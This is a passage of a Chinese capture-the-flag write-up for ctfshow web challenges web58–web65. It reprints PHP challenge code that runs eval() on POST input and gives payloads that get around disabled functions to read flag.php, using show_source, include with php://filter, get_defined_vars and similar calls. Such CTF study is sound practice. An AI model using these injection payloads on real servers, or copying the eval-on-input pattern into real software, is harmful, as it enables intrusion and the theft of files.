punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;e05e5667-84e6-46a7-a067-f04e7668ec7c&#125;\n</code></pre>\n<h2 id=\"web58\"><a class=\"anchor\" href=\"#web58\">#</a> web58</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>各种命令执行函数都禁用了，新知识file_get_contents()\n\npayload：\nc=show_source('flag.php');\n\npayload2:\nc=echo file_get_contents('flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;4238bd73-196d-48b9-862e-a69c6d0fa3e6&#125;\n</code></pre>\n<h2 id=\"web59\"><a class=\"anchor\" href=\"#web59\">#</a> web59</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>这次禁用了file_get_contents()，但学到新知识include包含\n\n\npayload：\nc=show_source('flag.php');\n\npayload2:\npost:c=include($_GET[1]);\n?1=php://filter/read=convert.base64-encode/resource=flag.php\n</code></pre>\n<pre><code>ctfshow&#123;4d87fe96-9642-49b8-b744-e4c7dab09324&#125;\n</code></pre>\n<h2 id=\"web60\"><a class=\"anchor\" href=\"#web60\">#</a> web60</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>学到新知识，higtlight_file()\n\npayload：\npost:c=include($_GET[1]);\n?1=php://filter/read=convert.base64-encode/resource=flag.php\n\npayload2:\nc=show_source('flag.php');\n\npayload3:\nc=highlight_file('flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;f9f2fb7a-81ac-4957-ad1f-854be96f722c&#125;\n</code></pre>\n<h2 id=\"web61\"><a class=\"anchor\" href=\"#web61\">#</a> web61</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>payload:\nc=show_source('flag.php');\n\npayload2:\nc=highlight_file('flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;2b6eea44-6add-4cce-b493-5ebe63984a61&#125;\n</code></pre>\n<h2 id=\"web62\"><a class=\"anchor\" href=\"#web62\">#</a> web62</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>payload:\nc=include('flag.php');echo $flag;\n</code></pre>\n<pre><code>ctfshow&#123;9a7803c3-0788-40fd-8f01-fe77533d832c&#125;\n</code></pre>\n<h2 id=\"web63\"><a class=\"anchor\" href=\"#web63\">#</a> web63</h2>\n<p>命令执行，突破禁用函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>新知识var_dump(get_defined_vars())\t//获取所有注册变量\npayload：\nc=include('flag.php');var_dump(get_defined_vars());\n</code></pre>\n<pre><code>ctfshow&#123;50fc64f3-422d-4eb5-a4fb-9a6be342966e&#125;\n</code></pre>\n<h2 id=\"web64\"><a class=\"anchor\" href=\"#web64\">#</a> web64</h2>\n<p>命令执行，突破禁用函数，真的是 秀不过你们</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>payload:\nc=include('flag.php');var_dump(get_defined_vars());\n\npayload2:\nc=highlight_file('flag.php');\n\npayload3:\nc=show_source('flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;ba1dc4b3-3df1-4349-aec2-42f8b948ce91&#125;\n</code></pre>\n<h2 id=\"web65\"><a class=\"anchor\" href=\"#web65\">#</a> web65</h2>\n<p>命令执行，突破禁用函数，求你们别秀了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span 